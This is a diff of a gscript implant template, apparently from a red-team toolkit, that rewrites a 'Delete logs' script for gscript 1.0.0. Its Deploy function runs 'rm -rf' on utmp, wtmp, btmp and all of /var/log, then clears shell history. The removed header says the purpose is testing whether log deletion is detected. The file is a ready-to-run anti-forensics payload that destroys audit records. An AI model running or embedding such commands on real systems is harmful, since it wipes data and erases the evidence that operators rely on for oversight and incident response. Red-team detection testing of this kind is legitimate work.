@@ -1,38 +1,28 @@
 // Example gscript template
-// Title: Delete Logs
+// Title: Delete logs
 // Author: ahhh
-// Purpose: Deletes a number of critical security logs on a linux machine, to see if this is detected by the lack of logs or deletion
-// Gscript version: 0.1.2
-// ATT&CK: https://attack.mitre.org/wiki/Technique/T1146
-// Note: must run implant as root
+// Purpose: deleting some logs on linux
+// Gscript version: 1.0.0
+// ATT&CK: 
 
 //priority:150
 //timeout:150
+//go_import:github.com/gen0cide/gscript/stdlib/exec as exec
 
-function BeforeDeploy() {
-  LogInfo("starting execution of Delete Logs");
-  var well = GetUser();
-  LogInfo("Our user is: "+well.username);
-  if (well.username == "root") {
-    return true;
-  } else {
-    LogInfo("Detected a non-root user, this needs to run as root!");
-    Halt();
-    return false;
-  }
-  return true; 
-}
-
-function Deploy() {  
-  //rm -rf /var/run/utmp /var/run/wtmp /var/run/btmp /var/log/
-  ForkExecuteCommand("rm", ["-rf", "/var/run/utmp", "/var/run/wtmp", "/var/run/btmp", "/var/log/"]);
-  LogInfo("Removed /var/run/utmp, /var/run/wtmp, /var/run/btmp, and all of /var/log/");
-  ForkExecuteCommand("history", ["-c"]);
-  LogInfo("Cleared the bash history");
-  return true;
-}
-
-function AfterDeploy() {
-  LogInfo("done Delete Logs");
-  return true;
+function Deploy() {
+    //rm -rf /var/run/utmp /var/run/wtmp /var/run/btmp /var/log/
+    var response = exec.ExecuteCommand("rm", ["-rf", "/var/run/utmp", "/var/run/wtmp", "/var/run/btmp", "/var/log/"]);
+    console.log("Pid: "+response[0]);
+    console.log("stdout: "+response[1]);
+    console.log("stderr: "+response[2]);
+    console.log("exit code: "+response[3]);
+    console.log("go errors: "+response[4]);
+    console.log("Removed /var/run/utmp, /var/run/wtmp, /var/run/btmp, and all of /var/log/");
+    var response2 = exec.ExecuteCommand("history", ["-c"]);
+    console.log("Pid: "+response2[0]);
+    console.log("stdout: "+response2[1]);
+    console.log("stderr: "+response2[2]);
+    console.log("exit code: "+response2[3]);
+    console.log("go errors: "+response2[4]);
+    console.log("Cleared the bash history");
 }
